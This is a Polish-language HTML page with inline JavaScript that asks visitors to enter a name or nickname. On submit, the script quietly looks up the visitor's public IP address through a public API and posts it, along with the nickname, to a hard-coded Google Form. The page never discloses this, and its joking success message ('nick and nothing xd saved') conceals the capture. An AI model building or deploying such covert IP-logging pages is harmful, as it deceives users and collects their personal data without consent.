<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wprowadź swój nick</title>
</head>
<body>
    <h1>Wprowadź swoje imię lub nick:</h1>
    <input type="text" id="username" placeholder="Twoje imię lub nick" required>
    <button onclick="submitUsername()">Zatwierdź</button>
    <script>
        async function getUserIP() {
            // Używamy publicznego API do pobrania adresu IP
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip; // Zwraca adres IP
        }
        async function submitUsername() {
            const username = document.getElementById('username').value;
            if (!username) {
                alert('Wprowadź swoje imię lub nick!');
                return;
            }
            // ID formularza Google i pola formularza
            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSe5q0Itgar0bfb8--jN7ykQr_tAOrvYzhBf6DpAOJGD0ReYKA/formResponse";
            const formFieldID = "entry.1068117997";  // ID pola formularza
            try {
                // Uzyskaj adres IP
                const userIP = await getUserIP();
                // Dodaj adres IP do wartości
                const prefixedUsername = `IP: ${userIP}, Użytkownik: ${username}`;
                // Utwórz dane formularza
                const formData = new FormData();
                formData.append(formFieldID, prefixedUsername);
                // Wyślij dane do formularza Google
                await fetch(formUrl, {
                    method: "POST",
                    mode: "no-cors",
                    body: formData
                });
                alert("Nick i nic xd zapisane pomyślnie!");
                document.getElementById('username').value = ""; // Wyczyść pole po wysłaniu
            } catch (error) {
                console.error("Błąd:", error);
                alert("Wystąpił błąd podczas zapisu.");
            }
        }
    </script>
</body>
</html>
